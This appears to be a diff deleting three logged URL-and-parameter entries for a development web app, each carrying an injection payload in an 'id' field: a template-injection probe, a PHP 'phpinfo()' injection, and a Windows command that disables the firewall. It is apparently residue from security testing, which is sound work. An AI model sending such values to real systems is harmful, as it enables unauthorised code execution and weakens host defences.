@@ -1,3 +1,0 @@
-url : http://resources.pmrms-dev.greatpmo.com/resources-task, parameter : {'id': '{{person.name}}'}
-url : http://resources.pmrms-dev.greatpmo.com/resources-task/delete-comment, parameter : {'id': '& phpinfo()'}
-url : http://resources.pmrms-dev.greatpmo.com/leave-request, parameter : {'id': 'netsh firewall set opmode disable'}
